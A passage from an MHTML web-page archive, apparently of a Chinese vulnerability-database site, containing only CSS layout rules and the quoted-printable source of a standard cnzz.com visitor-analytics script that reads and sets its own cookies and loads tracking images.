	PADDING-RIGHT: 0px; PADDING-LEFT: 10px; PADDING-BOTTOM: 0px; =
PADDING-TOP: 0px
}
.posttitle {
	PADDING-RIGHT: 0px; PADDING-LEFT: 5px; PADDING-BOTTOM: 2px; FONT: bold =
12px verdana; PADDING-TOP: 2px
}
.indexseach {
	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 120px; =
PADDING-TOP: 120px; TEXT-ALIGN: center
}
.indexseach TABLE {
	PADDING-RIGHT: 230px; PADDING-LEFT: 230px; PADDING-BOTTOM: 0px; =
PADDING-TOP: 0px
}
.li_list {
	CLEAR: both; PADDING-RIGHT: 0px; PADDING-LEFT: 12px; PADDING-BOTTOM: =
0px; PADDING-TOP: 0px
}
.li_list LI {
	CLEAR: both; PADDING-RIGHT: 3px; PADDING-LEFT: 3px; PADDING-BOTTOM: =
3px; PADDING-TOP: 3px; LIST-STYLE-TYPE: square; HEIGHT: 17px
}
.li_more {
	CLEAR: both; PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: =
2px; MARGIN: 5px 0px; PADDING-TOP: 0px; TEXT-ALIGN: right
}
.li_time {
	PADDING-RIGHT: 25px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; =
PADDING-TOP: 0px
}
.tabberlive .tabbertabhide {
	DISPLAY: none
}
.tabberlive .tabbertab H2 {
	DISPLAY: none
}
.tabberlive .tabbertab H3 {
	DISPLAY: none
}
DIV.pages SPAN.disabled {
	DISPLAY: none
}
.bugexp_info {
	PADDING-RIGHT: 0px; PADDING-LEFT: 10px; PADDING-BOTTOM: 0px; =
PADDING-TOP: 0px
}
.bugexp_url {
	COLOR: #ce0700
}
.tags {
	FONT-WEIGHT: 700; COLOR: #f00
}
.it_search {
	PADDING-RIGHT: 1px; PADDING-LEFT: 1px; FONT-SIZE: 17px; PADDING-BOTTOM: =
1px; PADDING-TOP: 2px; HEIGHT: 22px
}
.topb {
	PADDING-RIGHT: 3px; PADDING-LEFT: 3px; FONT-SIZE: 12px; FLOAT: right; =
PADDING-BOTTOM: 3px; MARGIN: 3px; PADDING-TOP: 3px
}
.list_other {
	PADDING-RIGHT: 3px; PADDING-LEFT: 3px; FLOAT: right; PADDING-BOTTOM: =
3px; MARGIN: 3px; PADDING-TOP: 3px
}
.kmyad {
	PADDING-RIGHT: 5px; PADDING-LEFT: 5px; FLOAT: right; PADDING-BOTTOM: =
5px; MARGIN: 10px 5px 0px 0px; PADDING-TOP: 5px
}
.type-info {
	CLEAR: both; PADDING-RIGHT: 12px; PADDING-LEFT: 8px; PADDING-BOTTOM: =
0px; PADDING-TOP: 0px
}
.type-info PRE {
	BORDER-RIGHT: #ddd 1px solid; PADDING-RIGHT: 5px; BORDER-TOP: #ddd 1px =
solid; PADDING-LEFT: 5px; BACKGROUND: #f3f3f3; PADDING-BOTTOM: 5px; =
MARGIN: 0px; BORDER-LEFT: #ddd 1px solid; LINE-HEIGHT: 20px; =
PADDING-TOP: 5px; BORDER-BOTTOM: #ddd 1px solid
}
.lists {
	FLOAT: left; MARGIN: 0px auto; WIDTH: 100%; LIST-STYLE-TYPE: none
}
.lists UL {
	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; LIST-STYLE-POSITION: outside; =
FLOAT: left; PADDING-BOTTOM: 0px; MARGIN: 20px 10px 10px 20px; WIDTH: =
100%; PADDING-TOP: 0px; LIST-STYLE-TYPE: none
}
.lists UL LI {
	DISPLAY: inline; FLOAT: left; MARGIN: 0px; WIDTH: 24.5%; LINE-HEIGHT: =
24px
}
.applists {
	FLOAT: left; MARGIN: 10px 0px; WIDTH: 100%; BORDER-BOTTOM: #ccc 1px =
dashed; LIST-STYLE-TYPE: none
}
.applists UL {
	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; LIST-STYLE-POSITION: outside; =
FLOAT: left; PADDING-BOTTOM: 0px; MARGIN: 5px 10px 20px 20px; WIDTH: =
100%; PADDING-TOP: 0px; LIST-STYLE-TYPE: none
}
.applists UL LI {
	DISPLAY: inline; FLOAT: left; MARGIN: 0px; WIDTH: 25%; LINE-HEIGHT: =
24px
}
.return_top {
	PADDING-LEFT: 820px; FONT-SIZE: 10px; VERTICAL-ALIGN: bottom; align: =
right
}
.return_top A {
	COLOR: #666; TEXT-DECORATION: none
}
.return_en {
	FONT-WEIGHT: 900; FONT-SIZE: 22px; VERTICAL-ALIGN: top; COLOR: #666; =
align: left
}
.return_Nav {
	PADDING-LEFT: 5px; FONT-WEIGHT: bold; FONT-SIZE: 15px; align: left
}
.return_Nadir {
	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-WEIGHT: 900; FONT-SIZE: =
15px; PADDING-BOTTOM: 15px; PADDING-TOP: 20px
}
.partnerlogo {
	PADDING-RIGHT: 7px; PADDING-LEFT: 30px; PADDING-BOTTOM: 7px; =
PADDING-TOP: 7px
}
.partnerlogo IMG {
	BORDER-RIGHT: #ccc 1px solid; PADDING-RIGHT: 1px; BORDER-TOP: #ccc 1px =
solid; PADDING-LEFT: 1px; PADDING-BOTTOM: 1px; MARGIN: 1px; BORDER-LEFT: =
#ccc 1px solid; PADDING-TOP: 1px; BORDER-BOTTOM: #ccc 1px solid
}
.linksno {
	PADDING-RIGHT: 0px; PADDING-LEFT: 30px; FLOAT: left; PADDING-BOTTOM: =
0px; MARGIN: 1px 10px 2px 0px; WIDTH: 100%; PADDING-TOP: 0px; =
LIST-STYLE-TYPE: none
}
.linksno UL {
	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; LIST-STYLE-POSITION: outside; =
FLOAT: left; PADDING-BOTTOM: 0px; MARGIN: 1px 10px 2px 2px; WIDTH: 100%; =
PADDING-TOP: 0px; LIST-STYLE-TYPE: none
}
.linksno UL LI {
	DISPLAY: inline; FLOAT: left; MARGIN: 0px; WIDTH: 10%; LINE-HEIGHT: =
24px
}
.aboutinfo {
	PADDING-RIGHT: 7px; PADDING-LEFT: 30px; PADDING-BOTTOM: 7px; =
PADDING-TOP: 7px
}

------=_NextPart_000_0012_01CADCA8.8DE7B6F0
Content-Type: text/css;
	charset="gb2312"
Content-Transfer-Encoding: quoted-printable
Content-Location: http://cache.ssvdb.com/640564311/style_ie.css

PRE {
	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; MARGIN: =
0px; OVERFLOW: auto; PADDING-TOP: 0px; WORD-WRAP: break-word
}

------=_NextPart_000_0012_01CADCA8.8DE7B6F0
Content-Type: application/octet-stream
Content-Transfer-Encoding: quoted-printable
Content-Location: http://s48.cnzz.com/stat.php?id=355990&web_id=355990

function gv_cnzz(of){=0A=
	var es =3D document.cookie.indexOf(";",of);=0A=
	if(es=3D=3D-1) es=3Ddocument.cookie.length;=0A=
	return unescape(document.cookie.substring(of,es));=0A=
}=0A=
function gc_cnzz(n){=0A=
	var arg=3Dn+"=3D";=0A=
	var alen=3Darg.length;=0A=
	var clen=3Ddocument.cookie.length;=0A=
	var i=3D0;=0A=
	while(i<clen){=0A=
	var j=3Di+alen;=0A=
	if(document.cookie.substring(i,j)=3D=3Darg) return gv_cnzz(j);=0A=
	i=3Ddocument.cookie.indexOf(" ",i)+1;=0A=
	if(i=3D=3D0)	break;=0A=
	}=0A=
	return -1;=0A=
}=0A=
var cnzz_ed=3Dnew Date();=0A=
var cnzz_now=3DparseInt(cnzz_ed.getTime());=0A=
var =
cnzz_data=3D'&r=3D'+escape(document.referrer.substr(0,512))+'&lg=3D'+esca=
pe(navigator.systemLanguage)+'&ntime=3D0.40697400 1271308824';=0A=
var cnzz_a=3Dgc_cnzz("cnzz_a355990");=0A=
if(cnzz_a!=3D-1) cnzz_a=3DparseInt(cnzz_a)+1;=0A=
else cnzz_a=3D0;=0A=
var rt=3DparseInt(gc_cnzz("rtime"));=0A=
var lt=3DparseInt(gc_cnzz("ltime"));=0A=
var cnzz_st =3D parseInt((cnzz_now-lt)/1000);=0A=
var cnzz_sin =3D gc_cnzz("sin355990");=0A=
if(cnzz_sin=3D=3D-1) cnzz_sin=3D'none';=0A=
if( document.referrer.split('/')[2]!=3Ddocument.domain ) =
cnzz_sin=3Ddocument.referrer;=0A=
var cnzz_eid=3Dgc_cnzz("cnzz_eid");=0A=
if(cnzz_eid=3D=3D-1) =
cnzz_eid=3DMath.floor(Math.random()*100000000)+"-"+1271308824+"-"+documen=
t.referrer.substr(0,64);=0A=
if(lt<1000000){rt=3D0;lt=3D0;}=0A=
if(rt<1) rt=3D0;=0A=
if(((cnzz_now-lt)>500*86400)&&(lt>0)) rt++;=0A=
cnzz_data=3Dcnzz_data+'&repeatip=3D'+cnzz_a+'&rtime=3D'+rt+'&cnzz_eid=3D'=
+escape(cnzz_eid)+'&showp=3D'+escape(screen.width+'x'+screen.height)+'&st=
=3D'+cnzz_st+'&sin=3D'+escape(cnzz_sin.substr(0,512))+'&res=3D0';=0A=
document.write('<a =
href=3D"http://www.cnzz.com/stat/website.php?web_id=3D355990" =
target=3D_blank =
title=3D"&#31449;&#38271;&#32479;&#35745;">&#31449;&#38271;&#32479;&#3574=
5;</a>');=0A=
document.write('<img =
src=3D"http://b75.cnzz.com/stat.htm?id=3D355990'+cnzz_data+'" border=3D0 =
width=3D0 height=3D0 />');=0A=
=0A=
document.write('<img =
src=3D"http://zs4.cnzz.com/stat.htm?id=3D355990'+cnzz_data+'" border=3D0 =
width=3D0 height=3D0 />');=0A=
var =
cnzz_et=3D(86400-cnzz_ed.getHours()*3600-cnzz_ed.getMinutes()*60-cnzz_ed.=
getSeconds());=0A=
cnzz_ed.setTime(cnzz_now+1000*(cnzz_et-cnzz_ed.getTimezoneOffset()*60));=0A=
document.cookie=3D"cnzz_a355990=3D"+cnzz_a+";expires=3D"+cnzz_ed.toGMTStr=
ing()+ "; path=3D/";=0A=
document.cookie=3D"sin355990=3D"+escape(cnzz_sin)+ =
";expires=3D"+cnzz_ed.toGMTString()+";path=3D/";=0A=
cnzz_ed.setTime(cnzz_now+1000*86400*182);=0A=
document.cookie=3D"rtime=3D"+rt+";expires=3D"+cnzz_ed.toGMTString()+ =
";path=3D/";=0A=
document.cookie=3D"ltime=3D"+cnzz_now+";expires=3D" + =
cnzz_ed.toGMTString()+ ";path=3D/";=0A=
document.cookie=3D"cnzz_eid=3D"+escape(cnzz_eid)+ =
";expires=3D"+cnzz_ed.toGMTString()+";path=3D/";=0A=

------=_NextPart_000_0012_01CADCA8.8DE7B6F0--
